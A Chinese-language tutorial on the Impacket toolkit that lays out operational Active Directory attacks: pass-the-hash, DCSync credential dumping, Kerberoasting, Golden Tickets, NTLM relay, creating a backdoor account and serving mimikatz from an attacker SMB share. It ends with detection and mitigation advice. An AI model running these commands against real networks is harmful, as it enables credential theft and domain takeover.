# Impacket Windows网络协议工具集完全指南

> 分类：工具指南 | 难度：进阶→专家 | 阅读时间：约55分钟

## 概述

Impacket 是 SecureAuth（前 Core Security）开发的 Python 库和工具集，提供对 Windows 网络协议（SMB、RPC、WMI、Kerberos、NetBIOS）的低级访问。它是一套"积木式"工具——每个工具解决一个特定问题，组合起来构成完整的域渗透和横向移动体系。几乎所有现代 Active Directory 渗透测试都离不开 Impacket。

**核心工具分类**：
| 类别 | 工具 | 功能 |
|:---|:---|:---|
| **远程执行** | psexec.py, wmiexec.py, smbexec.py, dcomexec.py, atexec.py | 多种方式的远程命令执行 |
| **凭据提取** | secretsdump.py, mimikatz.py | 哈希导出、DCSync |
| **Kerberos 攻击** | GetNPUsers.py, GetUserSPNs.py, ticketer.py | AS-REP/Kerberoast/Golden Ticket |
| **认证与中继** | ntlmrelayx.py, smbrelayx.py | NTLM 中继攻击 |
| **服务交互** | smbclient.py, smbserver.py, rpcdump.py | SMB/RPC 客户端 |
| **枚举与侦察** | lookupsid.py, samrdump.py, reg.py | 用户/组/权限枚举 |

## 核心知识点

- 远程执行工具链：psexec → wmiexec → smbexec → dcomexec 的使用场景与差异
- secretsdump.py 完整凭据提取（SAM/LSA/NTDS）
- Kerberos 攻击三件套（AS-REP Roasting / Kerberoasting / Golden Ticket）
- NTLM 中继攻击（ntlmrelayx）原理与防御
- Impacket 库的 Python 编程使用
- 防御视角：检测 Impacket 活动

---

## 一、安装

### 1.1 Kali Linux（预装）

```bash
# Kali 默认安装，路径 /usr/share/doc/python3-impacket/examples/
impacket-secretsdump
impacket-psexec
impacket-wmiexec

# 更新到最新版
pip install impacket --upgrade
```

### 1.2 Ubuntu/Debian

```bash
# pip 安装（推荐）
sudo apt install python3-pip -y
pip3 install impacket

# 或从源码安装（最新特性）
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install -r requirements.txt
pip3 install .

# 验证
python3 -c "from impacket import version; print(version.BANNER)"
```

### 1.3 macOS

```bash
brew install python3
pip3 install impacket
```

### 1.4 Windows

```powershell
# 需要 Python 3.7+
python -m pip install impacket

# 或下载 release 包
# https://github.com/fortra/impacket/releases
```

### 1.5 常见安装问题

| 问题 | 解决方案 |
|:---|:---|
| `pycrypto` 编译失败 | `pip install pycryptodome`（替代库）|
| `ldap3` 版本冲突 | `pip install ldap3==2.9.1` |
| `ImportError: dsinternals` | `pip install dsinternals` |
| ssl/_ssl 模块缺失 | `sudo apt install libssl-dev && pip uninstall impacket && pip install impacket` |
| No module named 'OpenSSL' | `pip install pyopenssl` |

---

## 二、远程执行工具链

### 2.1 psexec.py —— 最常用

```bash
# 通过 SMB 写入服务并执行（写入 %TEMP% 目录的服务 exe）
impacket-psexec corp.local/admin:Password123@10.0.0.10

# 获取 SYSTEM 权限的 Shell
impacket-psexec -hashes LM_HASH:NT_HASH corp.local/admin@10.0.0.10
# -hashes: 使用哈希认证（Pass-the-Hash）

# 执行单条命令
impacket-psexec corp.local/admin:pass@10.0.0.10 "whoami"
impacket-psexec corp.local/admin:pass@10.0.0.10 "net user backdoor pass123 /add"

# Kerberos 认证
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
# -k: Kerberos 认证
# -no-pass: 使用票据
```

**工作原理**：
```
1. 连接 ADMIN$ 共享
2. 上传随机名的服务执行文件到 %TEMP%
3. 通过 SCM（服务控制管理器）创建并启动服务
4. 服务以 SYSTEM 权限执行
5. 通信通过命名管道（\\.\pipe\ 随机名）
6. 执行完成 → 删除服务 + 删除文件
```

**特征检测**：
- 事件 ID 7045: 服务创建（随机名）
- 文件写入: \\*\ADMIN$\Temp\xxxxxx.exe
- 注册表: HKLM\SYSTEM\CurrentControlSet\Services\随机名

### 2.2 wmiexec.py —— 隐蔽性更好

```bash
# WMI 执行（无需上传文件，无服务创建）
impacket-wmiexec corp.local/admin:pass@10.0.0.10

# 交互式半 Shell
impacket-wmiexec corp.local/admin:pass@10.0.0.10 "ipconfig /all"

# 静默模式（减小输出）
impacket-wmiexec -silentcommand corp.local/admin:pass@10.0.0.10 "cmd命令"

# Pass-the-Hash
impacket-wmiexec -hashes :NT_HASH corp.local/admin@10.0.0.10
```

**优缺点**：
- ✅ 不写磁盘（服务/文件）
- ✅ 较隐蔽
- ❌ 无完整交互式 Shell
- ❌ 依赖 WinRM/WMI 服务

### 2.3 smbexec.py —— 落地文件

```bash
# SMB 执行（写入 bat 文件到 %TEMP%）
impacket-smbexec corp.local/admin:pass@10.0.0.10

# 工作原理
# 1. 创建服务（通过 SCM）
# 2. 服务执行: cmd.exe /c %TEMP%\execute.bat
# 3. execute.bat 内容：原命令 2>&1 > %TEMP%\output
# 4. 读取 output 返回结果
```

### 2.4 dcomexec.py

```bash
# DCOM 远程执行（多种 DCOM 对象）
impacket-dcomexec corp.local/admin:pass@10.0.0.10

# 指定 DCOM 对象
impacket-dcomexec -object MMC20 corp.local/admin:pass@10.0.0.10
# 可选: MMC20, ShellWindows, ShellBrowserWindow, ExcelDDE
```

### 2.5 远程执行工具对比

| 工具 | 写入磁盘 | 服务创建 | 交互Shell | 隐蔽性 | 端口 |
|:---|:---:|:---:|:---:|:---:|:---:|
| psexec | ✅ | ✅ | ✅ | 低 | 445 |
| wmiexec | ❌ | ❌ | 半交互 | 高 | 135+动态 |
| smbexec | ✅ | ✅ | 半交互 | 低 | 445 |
| dcomexec | ❌ | ❌ | 半交互 | 中 | 135+动态 |
| atexec | ❌ | ❌ | ❌ | 中 | 445 |

---

## 三、凭据提取

### 3.1 secretsdump.py

```bash
# 提取本地 SAM + LSA
impacket-secretsdump corp.local/admin:pass@10.0.0.10

# DCSync（需要域管或 DCSync 权限）
impacket-secretsdump corp.local/administrator:pass@dc01.corp.local

# 仅 NTDS.dit（所有域用户哈希）
impacket-secretsdump corp.local/admin:pass@dc01.corp.local -just-dc-ntlm

# 仅 NTDS 中的 Kerberos 密钥
impacket-secretsdump corp.local/admin:pass@dc01.corp.local -just-dc

# Pass-the-Hash（提供哈希而非密码）
impacket-secretsdump -hashes :NT_HASH corp.local/admin@dc01.corp.local

# 输出解读
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# <用户名>:<RID>:<LM哈希>:<NT哈希>:::
# aad3...51404ee 是空密码的 LM 哈希标记
```

### 3.2 离线模式

```bash
# 从本地 SAM + SYSTEM 文件提取
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL

# 从 NTDS.dit 离线提取
impacket-secretsdump -ntds ntds.dit -system SYSTEM.save LOCAL
```

---

## 四、Kerberos 攻击

### 4.1 AS-REP Roasting

```bash
# 枚举不需要预认证的用户
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.5

# 获取 TGT 哈希（可离线破解）
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes

# 破解
hashcat -m 18200 asrep.hashes rockyou.txt -r rules/best64.rule
```

### 4.2 Kerberoasting

```bash
# 枚举有 SPN 的用户（服务账户）
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.5

# 请求 TGS 票据（可离线破解）
impacket-GetUserSPNs corp.local/user:pass -request -outputfile kerb_hashes.txt

# 批量导出
impacket-GetUserSPNs corp.local/user:pass -request -outputfile all_tgs.txt

# 破解
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r rules/best64.rule
```

### 4.3 Golden Ticket

```bash
# 获取 KRBTGT 哈希（需先 DCSync）
KRBTGT_HASH=xxxxx
DOMAIN_SID=S-1-5-21-123456789-1234567890-123456789

# 生成 Golden Ticket
impacket-ticketer -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain corp.local \
  -extra-pac \
  Administrator

# 或利用 Silver Ticket（针对特定服务）
impacket-ticketer -nthash SERVICE_NT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain corp.local \
  -spn cifs/dc01.corp.local \
  Administrator

# 使用票据
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

---

## 五、NTLM 中继攻击

### 5.1 ntlmrelayx.py

```bash
# 基础中继（将认证中继到目标列表）
impacket-ntlmrelayx -tf targets.txt -smb2support

# SOCKS 模式（中继后建立 SOCKS 代理）
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# 执行命令（中继成功后自动执行）
impacket-ntlmrelayx -tf targets.txt -c "whoami > C:\pwned.txt"

# 交互模式（手动连接）
proxychains impacket-smbclient corp.local/user:pass@127.0.0.1

# 配合 Responder
# 先启动 Responder 监听（禁用 SMB/HTTP）
sudo impacket-ntlmrelayx -tf targets.txt
# Responder 捕获的 Net-NTLMv2 hash 自动中继到目标
```

### 5.2 攻击链

```
[受害者] ----SMB认证请求----> [攻击机 Responder]
                                    |
                               [捕获 Net-NTLMv2 Hash]
                                    |
                               [ntlmrelayx 中继]
                                    |
                               [目标服务器] ----认证成功----> [执行命令/导出哈希]
```

---

## 六、完整域渗透流程实战

### 6.1 场景：从普通用户到域管理员

```bash
# 阶段1：凭据获取
# 通过钓鱼/漏洞获取普通域用户凭据 user:Password1

# 阶段2：域信息收集
impacket-lookupsid corp.local/user:Password1@10.0.0.5
# 枚举所有域 SID → 导出用户列表

impacket-samrdump corp.local/user:Password1@10.0.0.5
# 管理员组 → 域控制器 → 域成员

# 阶段3：AS-REP Roasting
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -o asrep_hashes
hashcat -m 18200 asrep_hashes rockyou.txt --force
# 可能获得 svc_backup 用户的密码

# 阶段4：委派权限升级
# 用新凭据进行 Kerberoasting
impacket-GetUserSPNs corp.local/svc_backup:pass -request -o kerb_hashes

# 阶段5：提取高权限账户
# 破解服务账户凭据后，secretsdump 导出
impacket-secretsdump corp.local/svc_sql:Password123@dc01.corp.local

# 阶段6：获得域管理员
# 使用 DCSync 导出的域管理员哈希
impacket-psexec -hashes :DOMAIN_ADMIN_NT_HASH corp.local/Administrator@dc01.corp.local
```

---

## 七、进阶：SMB 客户端与服务端

### 7.1 smbclient.py

```bash
# 交互式 SMB 客户端
impacket-smbclient corp.local/user:pass@fileserver

# 进入后命令
smb: \> shares           # 列出共享
smb: \> use C$           # 切换共享
smb: \> ls               # 列出文件
smb: \> get payroll.xlsx # 下载文件
smb: \> put nc.exe       # 上传文件
smb: \> cd Windows\Temp  # 切换目录
smb: \> info             # 磁盘信息
smb: \> tree             # 目录树
```

### 7.2 smbserver.py

```bash
# 在攻击机搭建 SMB 共享（传文件/工具到目标）
impacket-smbserver -smb2support tools /opt/tools
# 目标机访问：\\192.168.1.100\tools\mimikatz.exe

# 认证模式（收集 Net-NTLMv2）
impacket-smbserver -smb2support share /tmp -user attacker -pass pass
# 目标连接：net use \\192.168.1.100\share /user:attacker pass
# 捕获 Net-NTLMv2 hash
```

---

## 八、防御检测

### 8.1 Windows 事件日志

| 事件ID | 活动 | 工具 |
|:---|:---|:---|
| 4624 | 登录成功 | psexec/wmiexec |
| 4672 | 特权账户登录 | psexec |
| 4697 | 服务安装 | psexec（管理员安装服务）|
| 7045 | 新服务 | psexec |
| 4662 | DS-Replication操作 | secretsdump(DCSync)|
| 4768 | Kerberos TGT请求 | GetNPUsers |
| 4769 | Kerberos TGS请求 | GetUserSPNs |
| 4776 | NTLM认证 | ntlmrelayx |
| 5140 | 网络共享访问 | smbclient |

### 8.2 Sysmon 检测规则

```xml
<!-- 检测 Impacket psexec 服务创建 -->
<RuleGroup>
  <ProcessCreate onmatch="include">
    <Image condition="contains">services.exe</Image>
    <Image condition="contains">\Temp\</Image>
  </ProcessCreate>
</RuleGroup>
```

### 8.3 缓解措施

```
1. 启用 Windows Defender Credential Guard
2. 启用 Protected Users 组（高权限账户）
3. 启用 LSA Protection (RunAsPPL)
4. 限制 SMB/RPC 访问源 IP
5. 监控异常服务创建和 %TEMP% 二进制执行
6. 部署 Microsoft ATA / Defender for Identity
```

---

## 九、速查卡

```
远程执行:
  psexec:      impacket-psexec domain/user:pass@IP
  wmiexec:     impacket-wmiexec domain/user:pass@IP
  smbexec:     impacket-smbexec domain/user:pass@IP
  dcomexec:    impacket-dcomexec domain/user:pass@IP
  PtH:         -hashes :NT_HASH domain/user@IP

凭据:
  DCSync:      impacket-secretsdump domain/admin:pass@DC
  SAM dump:    impacket-secretsdump domain/admin:pass@IP

Kerberos:
  AS-REP:      impacket-GetNPUsers domain/ -usersfile users.txt
  Kerberoast:  impacket-GetUserSPNs domain/user:pass -request
  Golden:      impacket-ticketer -nthash KRBTGT -domain-sid SID

NTLM Relay:
  ntlmrelayx:  impacket-ntlmrelayx -tf targets.txt -smb2support
  SMB Server:  impacket-smbserver -smb2support name /path

交互:
  smbclient:   impacket-smbclient domain/user:pass@IP
  rpcdump:     impacket-rpcdump IP
  lookupsid:   impacket-lookupsid domain/user:pass@IP
```

---

> 📖 本文为"网安百宝箱"课程配套读物。
> 参考：Impacket 官方文档 https://github.com/fortra/impacket
> 更新于 2026-06-18
